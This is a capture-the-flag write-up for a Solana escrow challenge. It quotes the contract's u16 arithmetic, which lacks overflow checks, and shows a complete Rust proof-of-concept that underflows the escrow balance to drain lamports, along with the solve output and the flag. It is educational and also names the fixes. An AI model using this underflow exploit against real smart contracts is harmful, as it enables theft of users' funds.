---
description: WEB3 | 453 pts - 13 solves
---

## Utility Payment Service

>Description: Utility payment service. Deposit into your escrow account and make payments from the escrow. I was told it's a magic account. https://drive.google.com/file/d/1YVrLoB9V4K5BpVSBeVOL6W9dObQ71fEF/view?usp=sharing. 
>nc 43.154.34.214 8001

The contract was a simple Escrow Service that allows you to make payments. The challenge was divided into two components: server and solve folders. inside the first dir we had the entire source code of the contract, in the `solve` dir there was everything necessary to run the exploit.
Inside `solve/src` the exploit had to be written in rust, then we have to run `python solve.py` which will compile our contract exploit and send it to the chall server.
Moving on to the challenge analysis, we had 3 main functions available: 
- Deposit to escrow 
- Withdraw all balance in escrow 
- Pay utility service fees. 
What caught my attention was the `amount: u16`  parameter in the `deposit_escrow()` and `pay_utility_fees()` functions while our balance in initialization was defined as `u64`:

program/src/processor.rs:
```rust
fn pay_utility_fees(program: &Pubkey, accounts: &[AccountInfo], amount: u16) -> ProgramResult {

[...]
    let base_fee = 15_u16;
    if escrow_data.amount >= 10 {
        if amount < base_fee {
            escrow_data.amount -= base_fee;
        } else {
            assert!(escrow_data.amount >= amount);
            escrow_data.amount -= amount;
        }
    } else {
        msg!("ABORT: Cannot make payments when the escrow account has a balance less than 10 lamports.");
    }
[...]
}
```

server/src/main.rs:
```rust
const TARGET_AMT: u64 = 60_000;
const INIT_BAL: u64 = 50;
const RESERVE_BAL: u64 = 1_000_000;
``` 

Clearly something was off. Looking for integer undeflow/overflow for Solana smart contracts written in rust, I discovered that, in optimization mode, Rust doesn't make any checks:

>In debug mode, Rust adds built-in checks for overflow/underflow and panics when an overflow/underflow occurs at runtime. However, in release (or optimization) mode, Rust **silently ignores** this behavior by default and computes _two’s complement wrapping (e.g., 255+1 becomes 0 for_ an `u8` integer).

So if you want to do certain subtractions securely you should do it with `checked_sub()`  func or by turning on the `overflow-checks` in release mode by setting `overflow-checks = true` under `[profile.release]`. 
Note that actually, checks are made in `pay_utility_fees()` : if `amount > 15`, it makes sure that there's enough balance in escrow. However we can easily bypass that by calling multiple times the function with `amount < 15`.

Exploit scenario:
1) Perry deposit 10 lamports out of 50 (init balance) to escrow account.
2) Now Perry has 40 lamports on balance and 10 lamports in escrow account.
3) Perry calls `pay_utility_fees()` with `amount = 10` that deducts the tokens from the escrow account. Balance is = 0 now. Calling the function again, balance will underflow by -10, which will be converted to ~65526 lamports.
4) Perry withdraw all the ~65526 lamports with `withdraw_escrow()`.
5) We have successfully exploited the contract as we now have Balance > Target amount (60k lamports).
6) Catch the flag!

PoC:
solve/src/processor.rs:
```rust
use borsh::BorshSerialize;

use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    program::invoke,
    pubkey::Pubkey,
    system_program,
};

use utility_payment::{ServiceInstruction, deposit_escrow, withdraw_escrow, pay_utility_fees};

pub fn process_instruction(
    _program: &Pubkey,
    accounts: &[AccountInfo],
    _data: &[u8],
) -> ProgramResult {
    let account_iter = &mut accounts.iter();
    let utility_program = next_account_info(account_iter)?;
    let user = next_account_info(account_iter)?;
    let reserve = next_account_info(account_iter)?;
    let escrow_account = next_account_info(account_iter)?;
    let sys_prog_account = next_account_info(account_iter)?;

    invoke(
        &Instruction {
            program_id: *utility_program.key,
            accounts: vec![
                AccountMeta::new(*user.key, true),
                AccountMeta::new(*reserve.key, false),
                AccountMeta::new(*escrow_account.key, false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
            data: ServiceInstruction::Init { }
                .try_to_vec()
                .unwrap(),
        },
        &[
            reserve.clone(),
            escrow_account.clone(),
            user.clone(),
            sys_prog_account.clone(),
        ],
    )?;
    
    // EXPLOIT
    invoke(
        &(
            deposit_escrow(
                *utility_program.key, 
                *user.key,
                *reserve.key, 
                *escrow_account.key, 
                10)
        ), 
        &[
        reserve.clone(),
        escrow_account.clone(),
        user.clone(),
        ]
    )?;

    for _ in 1..3 {
        invoke(
            &(
                pay_utility_fees(
                    *utility_program.key,
                    *user.key,
                    *reserve.key,
                    *escrow_account.key,
                    10)
            ), 
            &[
            reserve.clone(),
            escrow_account.clone(),
            user.clone(),
            ]
        )?;
    }

    invoke(
        &(
            withdraw_escrow(
                *utility_program.key,
                *user.key,
                *reserve.key,
                *escrow_account.key)
        ), 
        &[
        reserve.clone(),
        escrow_account.clone(),
        user.clone(),
        ]
    )?;

    Ok(())
}
```

```shell
└─$ python solve.py HOST=43.154.34.214 PORT=8001 
cargo build-bpf
    Finished release [optimized] target(s) in 0.33s

cp ./target/deploy/utility_payment_solve.so .
[+] Opening connection to 43.154.34.214 on port 8001: Done

program: 6PHpa8eKa2vPssoLGasKCPRSvpjqrStU33ikSLBAUHRa
solve  : CYzKRYDyZbnoHuyzYv339T2p2qm4boWs5NKTixRx84xu
user   : AhvmMNAZsPGYGwtZbdnvvVDYemd3ZhaqevSHsHw3kmTa

user lamport before = 50
user lamport after = 65555

Flag: 
n1ctf{cashback_9dejko3vrpaxq8gsy6iu}

[*] Closed connection to 43.154.34.214 port 8001
```

> n1ctf{cashback_9dejko3vrpaxq8gsy6iu}